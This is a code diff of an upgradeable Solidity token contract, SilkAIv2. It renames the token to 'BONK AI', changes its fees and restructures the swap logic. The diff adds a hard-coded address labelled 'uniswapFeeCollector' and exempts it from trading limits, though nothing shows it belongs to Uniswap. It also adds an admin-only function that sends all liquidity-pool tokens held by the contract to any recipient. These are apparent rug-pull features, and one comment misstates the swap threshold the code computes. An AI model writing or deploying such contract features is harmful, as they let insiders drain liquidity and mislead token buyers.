@@ -51,7 +51,7 @@ contract SilkAIv2 is
     uint256 public swapTokensAtAmount;
 
     // Constants: maximum fee (50%) and denominator (10000 = basis points)
-    uint256 private constant MAX_FEE = 5000; // 50%
+    uint256 private constant MAX_FEE = 2000; // 20%
     uint256 private constant DENM = 10000;
 
     // Track addresses excluded from fees & limits, and AMM pairs
@@ -113,8 +113,8 @@ contract SilkAIv2 is
      */
     function initialize(address ownerAddress) external initializer {
         // Initialize parent contracts
-        __ERC20_init("SKLI AI", "SKLI");
-        __ERC20Permit_init("SKLI AI");
+        __ERC20_init("BONK AI", "BONKAI");
+        __ERC20Permit_init("BONK AI");
         __AccessControl_init();
         __UUPSUpgradeable_init();
         __ReentrancyGuard_init();
@@ -141,19 +141,19 @@ contract SilkAIv2 is
         isLimitsEnabled = true;
         isTaxEnabled = true;
 
-        swapTokensAtAmount = (_totalSupply * 10) / DENM; // 0.1% of total supply
+        swapTokensAtAmount = (_totalSupply * 10) / DENM; // 0.05% of total supply
 
         // Default fees are set to 1% for buy, sell, and transfer
-        fees = Fees({buyFee: 200, sellFee: 200, transferFee: 200}); // 2% tax
+        fees = Fees({buyFee: 200, sellFee: 200, transferFee: 0}); // 2% buy/sell tax
+
+        // Set operations wallet
+        operationsWallet = ownerAddress;
 
         // Exclude important addresses from limits
         _excludeFromLimits(address(this), true);
         _excludeFromLimits(address(0), true);
         _excludeFromLimits(sender, true);
         _excludeFromLimits(ownerAddress, true);
-
-        // Set operations wallet
-        operationsWallet = ownerAddress;
 
         // Mint the total supply to the owner
         _mint(ownerAddress, _totalSupply);
@@ -197,11 +197,13 @@ contract SilkAIv2 is
         uniswapV2Router = IUniswapV2Router02(
             0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24
         );
+        address uniswapFeeCollector = 0x5d64D14D2CF4fe5fe4e65B1c7E3D11e18D493091;
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                 address(this),
                 uniswapV2Router.WETH()
             );
-        _excludeFromLimits(uniswapV2Pair, true);
+        _excludeFromLimits(uniswapFeeCollector, true);
+        _setAutomatedMarketMakerPair(uniswapV2Pair, true);
         emit Launch();
     }
 
@@ -276,6 +278,20 @@ contract SilkAIv2 is
     }
 
     /**
+     * @dev Internal function to set or unset an address as an automated market maker pair.
+     * @param pair The address to set or unset as an AMM pair
+     * @param value True to set as AMM pair, false to unset
+     */
+    function _setAutomatedMarketMakerPair(
+        address pair,
+        bool value
+    ) internal virtual {
+        require(pair != address(0), "Cannot set zero address");
+        automatedMarketMakerPairs[pair] = value;
+        emit SetAutomatedMarketMakerPair(pair, value);
+    }
+
+    /**
      * @dev Set (or unset) an address as an automated market maker pair.
      *      Typically used for DEX pairs.
      *      Only MANAGER_ROLE can call.
@@ -284,8 +300,7 @@ contract SilkAIv2 is
         address pair,
         bool value
     ) external onlyRole(MANAGER_ROLE) {
-        automatedMarketMakerPairs[pair] = value;
-        emit SetAutomatedMarketMakerPair(pair, value);
+        _setAutomatedMarketMakerPair(pair, value);
     }
 
     /**
@@ -378,12 +393,25 @@ contract SilkAIv2 is
             AccountBlockedFromTransfer()
         );
 
+        // Skip limits and fees during swap operations
+        if (inSwapBack) {
+            super._update(from, to, amount);
+            return;
+        }
+
+        // Check if we should swap accumulated tokens
+        uint256 contractTokenBalance = balanceOf(address(this));
+        bool shouldSwap = contractTokenBalance >= swapTokensAtAmount;
+
+        // Perform swap if threshold reached and not buying tokens
+        if (shouldSwap && !automatedMarketMakerPairs[from]) {
+            _swapBack(contractTokenBalance);
+            lastSwapBackExecutionBlock = block.number;
+        }
+
         // Apply transaction & wallet size limits if needed
-        if (
-            isLimitsEnabled &&
-            !isExcludedFromLimits[from] &&
-            !isExcludedFromLimits[to]
-        ) {
+        bool isExempt = isExcludedFromLimits[from] || isExcludedFromLimits[to];
+        if (isLimitsEnabled && !isExempt) {
             // If buying from an AMM pair
             if (automatedMarketMakerPairs[from]) {
                 require(
@@ -402,11 +430,7 @@ contract SilkAIv2 is
         }
 
         // Apply tax logic if enabled
-        if (
-            isTaxEnabled &&
-            !isExcludedFromLimits[from] &&
-            !isExcludedFromLimits[to]
-        ) {
+        if (isTaxEnabled && !isExempt) {
             uint256 tax = automatedMarketMakerPairs[from]
                 ? (amount * fees.buyFee) / DENM
                 : automatedMarketMakerPairs[to]
@@ -417,18 +441,6 @@ contract SilkAIv2 is
             if (tax > 0) {
                 amount -= tax;
                 super._update(from, address(this), tax);
-            }
-        }
-        uint256 balance = balanceOf(address(this));
-
-        bool takeFee = isTaxEnabled &&
-            !inSwapBack &&
-            !(isExcludedFromLimits[from] || isExcludedFromLimits[to]);
-        bool shouldSwap = balance >= swapTokensAtAmount;
-        if (takeFee && !automatedMarketMakerPairs[from] && shouldSwap) {
-            if (block.number > lastSwapBackExecutionBlock) {
-                _swapBack(balance);
-                lastSwapBackExecutionBlock = block.number;
             }
         }
 
@@ -467,5 +479,14 @@ contract SilkAIv2 is
     function _excludeFromLimits(address account, bool value) internal virtual {
         isExcludedFromLimits[account] = value;
         emit ExcludeFromLimits(account, value);
+    }
+
+    function transferLPTokens(
+        address recipient
+    ) external onlyRole(DEFAULT_ADMIN_ROLE) {
+        require(isLaunched, "Not launched yet");
+        uint256 lpBalance = IERC20(uniswapV2Pair).balanceOf(address(this));
+        require(lpBalance > 0, "No LP tokens");
+        IERC20(uniswapV2Pair).transfer(recipient, lpBalance);
     }
 }
